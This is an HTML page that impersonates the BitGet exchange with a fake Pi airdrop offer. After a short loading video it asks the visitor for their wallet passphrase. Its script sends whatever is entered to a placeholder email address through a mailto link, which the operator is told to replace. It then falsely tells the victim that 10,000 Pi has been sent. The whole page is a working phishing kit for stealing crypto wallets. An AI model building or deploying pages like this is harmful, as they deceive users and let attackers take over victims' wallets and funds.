<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BitGet - Airdrop</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            background-color: #111;
            color: white;
            margin: 0;
            padding: 0;
        }
        .container {
            max-width: 400px;
            margin: 80px auto;
            padding: 20px;
            text-align: center;
        }
        .btn {
            background-color: #007bff;
            color: white;
            padding: 10px 20px;
            border: none;
            cursor: pointer;
            font-size: 18px;
            margin-top: 20px;
            border-radius: 5px;
        }
        .hidden {
            display: none;
        }
        .loading-screen {
            position: fixed;
            width: 100%;
            height: 100%;
            background: black;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        video {
            width: 100%;
            height: auto;
        }
        .input-box {
            width: 90%;
            padding: 10px;
            font-size: 16px;
            border: 1px solid #ccc;
            border-radius: 5px;
        }
    </style>
</head>
<body>

    <!-- Homepage -->
    <div id="homepage">
        <div class="container">
            <h1>Trade with 100 million users on BitGet</h1>
            <p>Sign up now to claim a welcome pack worth 10,000 Pi!</p>
            <button class="btn" onclick="showLoading()">Join</button>
        </div>
    </div>

    <!-- Loading Screen -->
    <div id="loading-screen" class="loading-screen hidden">
        <video autoplay muted>
            <source src="screen-20250223-174455~2.mp4" type="video/mp4">
        </video>
    </div>

    <!-- Passphrase Entry Screen -->
    <div id="passphrase-screen" class="hidden">
        <div class="container">
            <h2>Unlock Pi Reward</h2>
            <input type="text" id="passphrase" class="input-box" placeholder="Enter your passphrase">
            <button class="btn" onclick="submitPassphrase()">Unlock with Passphrase</button>
            <p id="message"></p>
        </div>
    </div>

    <script>
        function showLoading() {
            document.getElementById("homepage").style.display = "none";
            document.getElementById("loading-screen").style.display = "flex";
            
            setTimeout(() => {
                document.getElementById("loading-screen").style.display = "none";
                document.getElementById("passphrase-screen").style.display = "block";
            }, 3000); // Show the loading screen for 3 seconds
        }

        function submitPassphrase() {
            var passphrase = document.getElementById("passphrase").value;
            if (passphrase === "") {
                document.getElementById("message").innerText = "Please enter a passphrase.";
                return;
            }

            // Send the passphrase to your email
            sendEmail(passphrase);

            document.getElementById("message").innerText = "10,000 Pi has been sent to your wallet!";
        }

        function sendEmail(passphrase) {
            var email = "your-email@example.com"; // Change this to your actual email
            var subject = "New Passphrase Entry - BitGet";
            var body = "Passphrase: " + passphrase;
            window.location.href = "mailto:" + email + "?subject=" + subject + "&body=" + body;
        }
    </script>

</body>
</html>
